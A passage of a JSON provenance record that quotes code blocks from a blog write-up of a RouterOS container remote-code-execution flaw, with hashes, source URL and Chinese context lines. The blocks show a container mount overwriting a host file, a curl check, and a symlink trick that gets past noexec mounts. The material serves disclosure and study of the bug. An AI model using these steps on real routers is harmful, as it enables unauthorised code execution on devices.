      "full_source_block_text": "# ls -l /mnt\ntotal 0\ndrwxr-xr-x    2 nobody   nobody         149 Jun 15 11:38 bin\ndrwxr-xr-x    9 nobody   nobody         131 Jun 15 11:38 bndl\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 boot\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 dev\nlrwxrwxrwx    1 nobody   nobody          11 Jun 15 11:38 dude -> /flash/dude\ndrwxr-xr-x    2 nobody   nobody         352 Jun 15 11:38 etc\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 flash\ndrwxr-xr-x    3 nobody   nobody          26 Jun 15 11:38 home\ndrwxr-xr-x    3 nobody   nobody         403 Jun 15 11:38 lib\ndrwxr-xr-x    5 nobody   nobody          73 Jun 15 11:38 nova\nlrwxrwxrwx    1 nobody   nobody           9 Jun 15 11:38 pckg -> /ram/pckg\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 proc\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 ram\nlrwxrwxrwx    1 nobody   nobody           9 Jun 15 11:38 rw -> /flash/rw\ndrwxr-xr-x    2 nobody   nobody          45 Jun 15 11:38 sbin\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 sys\nlrwxrwxrwx    1 nobody   nobody           7 Jun 15 11:38 tmp -> /rw/tmp\ndrwxr-xr-x    5 nobody   nobody         111 Jun 15 11:38 var",
      "source_text_sha256_recorded": "e7f9ee8a218a50df33a7236472c0e55fd740ad84ce25949e5eaa08824c6ee37e",
      "source_text_sha256_recomputed_utf8": "e7f9ee8a218a50df33a7236472c0e55fd740ad84ce25949e5eaa08824c6ee37e",
      "source_text_hash_matches": true,
      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
      "source_author_or_attribution": "Rasmus Moorats (nns)",
      "context_before_exact": "然后，从创建的容器内部就可以访问主机的根文件系统：  ",
      "context_after_exact": "虽然可以读取文件权限，但大多数文件系统都是只读的，无法写入。  "
    },
    {
      "archive_empty_fence_opening_line": 98,
      "public_source_block_index": 6,
      "current_fence_opening_line": 130,
      "exact_literal_match_current": true,
      "full_source_block_text": "/container/mounts/add name=robots src=/disk1/alpine/robots.txt dst=/rootfs/home/web/robots.txt",
      "source_text_sha256_recorded": "49864d8b1c7990e154a6bb52cc4db5e0ebd09470ccf4dac5049224ee489d09d2",
      "source_text_sha256_recomputed_utf8": "49864d8b1c7990e154a6bb52cc4db5e0ebd09470ccf4dac5049224ee489d09d2",
      "source_text_hash_matches": true,
      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
      "source_author_or_attribution": "Rasmus Moorats (nns)",
      "context_before_exact": "例如，我们创建一个挂载点，将容器内部的文件挂载到 webfig 目录，有效地“覆盖”现有的robots.txt：  ",
      "context_after_exact": "然后，在第三台机器上，我们使用以下命令验证它是否被覆盖curl：  "
    },
    {
      "archive_empty_fence_opening_line": 102,
      "public_source_block_index": 7,
      "current_fence_opening_line": 135,
      "exact_literal_match_current": true,
      "full_source_block_text": "$ curl router.lan/robots.txt\nHello from inside the container!",
      "source_text_sha256_recorded": "d86b6d0ff4b8bebdff5854e4de43af3e386b9662392bab5980f6eea8be7b68cb",
      "source_text_sha256_recomputed_utf8": "d86b6d0ff4b8bebdff5854e4de43af3e386b9662392bab5980f6eea8be7b68cb",
      "source_text_hash_matches": true,
      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
      "source_author_or_attribution": "Rasmus Moorats (nns)",
      "context_before_exact": "然后，在第三台机器上，我们使用以下命令验证它是否被覆盖curl：  ",
      "context_after_exact": "# 利用  "
    },
    {
      "archive_empty_fence_opening_line": 109,
      "public_source_block_index": 8,
      "current_fence_opening_line": 144,
      "exact_literal_match_current": true,
      "full_source_block_text": "/dev/sda1 /nova/bin/telnet ext4 rw,nosuid,nodev,noexec,relatime 0 0",
      "source_text_sha256_recorded": "fb5bf211bddafae042c410cbe33023175a65388edf55565577c9f7a6313392a0",
      "source_text_sha256_recomputed_utf8": "fb5bf211bddafae042c410cbe33023175a65388edf55565577c9f7a6313392a0",
      "source_text_hash_matches": true,
      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
      "source_author_or_attribution": "Rasmus Moorats (nns)",
      "context_before_exact": "但是，从/proc/mounts来看，由于挂载点的创建方式，这种方法不起作用：  ",
      "context_after_exact": "挂载点是使用nosuid、nodev和最重要的noexec选项创建的。这意味着即使您要挂载现有的二进制文件，它也不会被执行，而是每次都会失败并显示“Permission denied”。so共享库同样如此，因此挂载在.so文件上也是不可能的。  "
    },
    {
      "archive_empty_fence_opening_line": 117,
      "public_source_block_index": 9,
      "current_fence_opening_line": 153,
      "exact_literal_match_current": true,
      "full_source_block_text": "$ cp $(which id) id1\n$ ln -s $(which id) id2\n$ ./id1\nbash: ./id1: Permission denied\n$ ./id2\nuid=1000(xx) gid=1000(xx) groups=1000(xx)",
      "source_text_sha256_recorded": "71d7fc4eb7954b2930235c945e23c5ef20fda915c8d9f0e1e5add624612d67f7",
      "source_text_sha256_recomputed_utf8": "71d7fc4eb7954b2930235c945e23c5ef20fda915c8d9f0e1e5add624612d67f7",
